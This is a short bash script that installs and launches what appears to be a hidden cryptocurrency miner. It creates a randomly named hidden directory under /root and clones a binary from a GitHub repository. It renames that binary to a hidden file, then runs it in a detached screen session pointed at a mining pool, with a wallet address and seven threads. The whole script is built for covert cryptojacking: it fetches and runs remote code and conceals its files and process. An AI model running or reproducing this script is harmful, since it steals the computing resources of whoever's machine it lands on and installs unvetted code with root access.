#!/bin/bash

F="/root/.$(head /dev/urandom | tr -dc a-z0-9 | head -c 6)"
B=".$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)"
S="$(head /dev/urandom | tr -dc a-z0-9 | head -c 10)"

apt-get update -y >/dev/null && apt-get install -y git screen >/dev/null

mkdir -p "$F" && cd "$F" || exit

[ ! -f "$B" ] && git clone --depth=1 https://github.com/root6789/home.git x >/dev/null 2>&1 && \
mv x/root "$B" && chmod +x "$B" && rm -rf x

screen -dmS "$S" "$F/$B" -c stratum+ssl://usw.vipor.net:5140 -u RQdUotwPueFvRY5xKfn6REsMUsBdhhmqdq.asia -p x --threads 7
